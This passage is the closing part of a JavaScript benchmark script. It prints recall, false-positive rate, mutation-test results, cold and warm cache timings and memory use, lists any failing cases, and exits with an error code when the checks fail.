    `BENCHMARK ${checkOnly ? "VERIFIED" : "GENERATED"}: corpus=${corpus.length} recall=${recallPct}% fpr=${fprPct}% mutations=${mutPassed}/${mutations.length} cold=${gitBench.coldMs.toFixed(1)}ms warm=${gitBench.warmMs.toFixed(1)}ms rss=${peakRssMb}MiB`,
  );
  if (!overallPass) {
    for (const r of caseRows.filter((x) => !x.ok)) {
      console.error(`  CORPUS FAIL: ${r.id} -> ${r.verdict}`);
    }
    for (const m of mutations.filter((x) => !x.passed)) {
      console.error(`  MUTATION FAIL: ${m.id} -> ${m.detail}`);
    }
    if (!cacheEffective) {
      console.error(`  CACHE FAIL: cold=${gitBench.coldMs.toFixed(1)}ms warm=${gitBench.warmMs.toFixed(1)}ms hits=${gitBench.coldCacheHits}->${gitBench.warmCacheHits}`);
    }
    process.exit(1);
  }
}

await main();
